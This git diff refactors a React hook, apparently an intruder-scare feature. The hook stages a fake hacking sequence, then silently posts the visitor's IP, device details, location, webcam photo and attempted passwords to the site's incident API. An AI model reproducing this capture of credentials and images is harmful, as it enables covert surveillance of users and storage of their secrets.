@@ -1,6 +1,6 @@
 "use client";
 
-import { useState, useEffect, useRef } from "react";
+import { useState, useEffect, useRef, useCallback } from "react";
 import type { DatosDispositivo, Coordenadas } from "../tipos";
 
 interface UseHackeoReturn {
@@ -25,31 +25,14 @@ export function useHackeo(
     const [fotoCapturada, setFotoCapturada] = useState<string | null>(null);
     const [coordenadas, setCoordenadas] = useState<Coordenadas | null>(null);
     const [datosDispositivo, setDatosDispositivo] = useState<DatosDispositivo | null>(null);
-    const [incidenteGuardado, setIncidenteGuardado] = useState(false);
+    const incidenteGuardadoRef = useRef(false);
     const videoRef = useRef<HTMLVideoElement>(null);
     const canvasRef = useRef<HTMLCanvasElement>(null);
 
-    // Efecto para la secuencia de hackeo
-    useEffect(() => {
-        if (modoHackeo && faseHackeo < 6) {
-            const timer = setTimeout(() => {
-                setFaseHackeo(prev => prev + 1);
-            }, faseHackeo === 0 ? 500 : 1500);
-            return () => clearTimeout(timer);
-        }
-    }, [modoHackeo, faseHackeo]);
-
-    // Efecto para guardar el incidente cuando se completa (solo una vez)
-    useEffect(() => {
-        if (modoHackeo && faseHackeo >= 5 && datosDispositivo && !incidenteGuardado) {
-            setIncidenteGuardado(true);
-            guardarIncidente();
-        }
-    }, [modoHackeo, faseHackeo, datosDispositivo, incidenteGuardado]);
-
-    async function guardarIncidente() {
+    // Función para guardar el incidente
+    const guardarIncidente = useCallback(async () => {
         try {
-            const response = await fetch("/api/incidentes", {
+            await fetch("/api/incidentes", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
@@ -72,11 +55,30 @@ export function useHackeo(
         } catch {
             // Silenciar errores en producción
         }
-    }
+    }, [ipCapturada, datosDispositivo, coordenadas, fotoCapturada, passwordsIntentadas, intentosFallidos]);
+
+    // Efecto para la secuencia de hackeo
+    useEffect(() => {
+        if (modoHackeo && faseHackeo < 6) {
+            const timer = setTimeout(() => {
+                setFaseHackeo(prev => prev + 1);
+            }, faseHackeo === 0 ? 500 : 1500);
+            return () => clearTimeout(timer);
+        }
+    }, [modoHackeo, faseHackeo]);
+
+    // Efecto para guardar el incidente cuando se completa (solo una vez)
+    useEffect(() => {
+        if (modoHackeo && faseHackeo >= 5 && datosDispositivo && !incidenteGuardadoRef.current) {
+            incidenteGuardadoRef.current = true;
+            guardarIncidente();
+        }
+    }, [modoHackeo, faseHackeo, datosDispositivo, guardarIncidente]);
 
     async function iniciarHackeo() {
         setModoHackeo(true);
         setFaseHackeo(0);
+        incidenteGuardadoRef.current = false;
 
         // Obtener IP
         try {
@@ -90,7 +92,10 @@ export function useHackeo(
         // Capturar datos del dispositivo
         const datos: DatosDispositivo = {
             navegador: navigator.userAgent.split(') ')[0].split('(')[1] || "Desconocido",
-            plataforma: navigator.platform || "Desconocido",
+            plataforma: (navigator as Navigator & { userAgentData?: { platform?: string } }).userAgentData?.platform || (() => {
+                const match = /(Windows|Mac|Linux|Android|iOS)/.exec(navigator.userAgent);
+                return match ? match[0] : "Desconocido";
+            })(),
             idioma: navigator.language || "Desconocido",
             pantalla: `${window.screen.width}x${window.screen.height}`,
             zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone,
